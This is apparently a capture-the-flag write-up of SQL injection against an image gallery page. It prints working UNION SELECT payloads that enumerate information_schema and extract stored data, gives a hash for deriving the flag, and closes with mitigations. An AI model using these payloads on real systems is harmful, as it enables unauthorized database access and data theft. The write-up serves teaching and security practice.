# Image Gallery SQL Injection

We tested the image page for SQL injection using:

`1 OR 1=1`

This returned multiple rows, confirming the vulnerability.

To enumerate tables:

`1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.TABLES`

To enumerate columns:

`1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS`

Relevant table and columns found:

- Table: `list_images`
- Columns: `id`, `url`, `title`, `comment`

To extract useful data:

`1 OR 1=1 UNION SELECT title, comment FROM Member_images.list_images`

A hint in the comments provided the hash `1928e8083cf461a51303633093573c46` and the transformation steps needed to derive the flag.

## Vulnerability
User input was inserted directly into SQL queries.

## Mitigation
Use prepared statements, check input format, and give the database user minimal rights.